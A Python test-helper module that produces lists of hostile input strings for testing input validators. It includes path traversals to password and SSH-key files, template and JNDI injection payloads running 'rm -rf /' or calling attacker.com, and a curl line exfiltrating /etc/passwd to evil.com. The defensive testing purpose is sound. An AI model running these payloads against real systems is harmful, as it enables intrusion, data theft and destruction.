"""Security testing helpers for generating malicious input patterns and injection scenarios.

This module provides systematic generation of security attack patterns for testing
security validation functions. Used across multiple security test slices.
"""


class SecurityScenarioGenerator:
    """Generator for security attack scenarios and malicious input patterns."""

    def directory_traversal_attempts(self) -> list[str]:
        """Generate directory traversal attack patterns.

        Returns:
            List of directory traversal attack strings
        """
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../root/.ssh/id_rsa",
            "../../../../../etc/shadow",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../../var/log/auth.log",
            "../../../home/.env",
            "../../../../proc/version",
            "../../../etc/environment",
            "..\\..\\..\\..\\..\\Program Files\\Microsoft\\Windows\\CurrentVersion",
            # Encoded versions
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32",
            # Double encoding
            "..%252F..%252F..%252Fetc%252Fpasswd",
            # Null byte injection
            "../../../etc/passwd\0.txt",
            # Mixed separators
            "../..\\../etc/passwd",
            # Absolute paths masquerading as relative
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            # Symlink-like patterns
            "../../../../../../../etc/passwd",
        ]

    def code_injection_patterns(self) -> list[str]:
        """Generate code injection attack patterns for template validation.

        Returns:
            List of code injection attack strings
        """
        return [
            "{{__import__('os').system('rm -rf /')}}",
            '{{ eval(\'__import__("os").system("whoami")\') }}',
            "{% import os %}{{ os.system('id') }}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{ ''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].exit() }}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${jndi:ldap://attacker.com/exploit}",
            "<%=system('cat /etc/passwd')%>",
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",  # Basic template injection
            "${7*7}",  # EL injection
            "#{7*7}",  # Spring EL
            "#set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('whoami')",
            "{{''|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')()|attr('__getitem__')(104)|attr('__init__')|attr('__globals__')|attr('__getitem__')('sys')|attr('exit')()}}",
        ]

    def malicious_user_inputs(self) -> list[str]:
        """Generate malicious user input patterns for sanitization testing.

        Returns:
            List of malicious user input strings
        """
        return [
            # Script injection
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "onload=alert('XSS')",
            # SQL injection patterns
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            # Command injection
            "; cat /etc/passwd",
            "| whoami",
            "& net user",
            "`whoami`",
            "$(whoami)",
            # Path injection
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            # Template injection
            "{{7*7}}",
            "${7*7}",
            # LDAP injection
            "(|(objectclass=*))",
            "*)(&(objectclass=user))",
            # Format string injection
            "%s%s%s%s",
            "%x%x%x%x",
            # Null bytes
            "normal\x00malicious",
            "file.txt\0.exe",
            # Unicode attacks
            "test\u202egnirts",  # Right-to-left override
            "test\ufeffmalicious",  # Byte order mark
            # Large inputs (buffer overflow attempts)
            "A" * 10000,
            "{{" + "A" * 1000 + "}}",
            # Encoding attacks
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        ]

    def malicious_file_paths(self) -> list[str]:
        """Generate malicious file path patterns.

        Returns:
            List of malicious file path strings
        """
        return [
            # Directory traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            # Absolute paths
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "/proc/version",
            # Special files
            "/dev/null",
            "/dev/random",
            "CON",  # Windows reserved name
            "PRN",  # Windows reserved name
            "AUX",  # Windows reserved name
            # Hidden files
            ".env",
            ".ssh/id_rsa",
            ".bashrc",
            # System directories
            "/root/",
            "/sys/",
            "/proc/",
            "C:\\Windows\\",
            "C:\\Users\\Administrator\\",
            # Network paths
            "//server/share/file",
            "\\\\server\\share\\file",
            # Long paths
            "A/" * 1000,
            "very_long_filename_" + "x" * 500 + ".txt",
            # Special characters
            "file\nwith\nnewlines.txt",
            "file\twith\ttabs.txt",
            "file with spaces and special chars !@#$%^&*().txt",
            # Encoded paths
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Csystem32",
        ]

    def credential_patterns(self) -> list[str]:
        """Generate credential-like patterns for sanitization testing.

        Returns:
            List of credential-like strings
        """
        return [
            # API keys
            "sk-abcdef1234567890abcdef1234567890",
            "AIzaSyAbCdEf1234567890abcdefghijklmnopqr",
            "AKIA1234567890ABCDEF",
            # Base64 encoded strings
            "dGVzdF9jcmVkZW50aWFsX3N0cmluZw==",
            "VGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIHN0cmluZw==",
            # Hex strings (hashes)
            "a1b2c3d4e5f6789012345678901234567890abcd",
            "1234567890abcdef1234567890abcdef12345678",
            # JWT tokens
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            # Long alphanumeric strings
            "abcdef1234567890abcdef1234567890abcdef12",
            "1234567890abcdefghijklmnopqrstuvwxyz123456",
            # Password-like patterns
            "password123",
            "admin123456",
            "secretkey123",
        ]

    def environment_variable_patterns(self) -> list[str]:
        """Generate environment variable patterns for sanitization testing.

        Returns:
            List of environment variable reference strings
        """
        return [
            "${HOME}",
            "${PATH}",
            "${USER}",
            "${PASSWORD}",
            "${API_KEY}",
            "${SECRET_TOKEN}",
            "$(whoami)",
            "$(cat /etc/passwd)",
            "$(rm -rf /)",
            "${SHELL:-/bin/bash}",
            "${HOME}/secrets/api_key.txt",
            "$(curl http://evil.com/exfiltrate?data=$(cat /etc/passwd))",
        ]

    def sensitive_command_arguments(self) -> list[str]:
        """Generate sensitive command argument patterns.

        Returns:
            List of command strings with sensitive arguments
        """
        return [
            "git clone --password=secret123 repo.git",
            "git push --token=abcdef123456 origin main",
            "git remote add origin https://user:password@github.com/repo.git",
            "curl --auth-token secret123 https://api.example.com",
            "wget --password=secret https://example.com/file",
            "rsync --password-file=/tmp/secret source dest",
            "ssh -i /home/user/.ssh/id_rsa user@host",
            "openssl --key=/path/to/private.key cert.crt",
        ]

    def generate_unicode_attacks(self) -> list[str]:
        """Generate Unicode-based attack patterns.

        Returns:
            List of Unicode attack strings
        """
        return [
            # Right-to-left override attacks
            "test\u202egnirts",
            "file\u202etxt.exe",
            # Homograph attacks
            "аpple.com",  # Cyrillic 'а' instead of Latin 'a'
            "g00gle.com",  # Zero instead of 'o'
            # Zero-width characters
            "test\u200bmalicious",
            "normal\u200ctext",
            "file\u200dname.txt",
            # Byte order mark
            "\ufeffmalicious_content",
            # Combining characters
            "e\u0301",  # é composed
            "a\u0300\u0301\u0302",  # Multiple combining marks
            # Normalization attacks
            "café",  # NFC form
            "cafe\u0301",  # NFD form
        ]


def create_security_scenario_generator() -> SecurityScenarioGenerator:
    """Create SecurityScenarioGenerator.

    Returns:
        Configured SecurityScenarioGenerator instance
    """
    return SecurityScenarioGenerator()


# Convenience functions for common patterns
def get_directory_traversal_patterns() -> list[str]:
    """Get directory traversal attack patterns."""
    return SecurityScenarioGenerator().directory_traversal_attempts()


def get_code_injection_patterns() -> list[str]:
    """Get code injection attack patterns."""
    return SecurityScenarioGenerator().code_injection_patterns()


def get_malicious_file_paths() -> list[str]:
    """Get malicious file path patterns."""
    return SecurityScenarioGenerator().malicious_file_paths()


def get_credential_patterns() -> list[str]:
    """Get credential-like patterns."""
    return SecurityScenarioGenerator().credential_patterns()
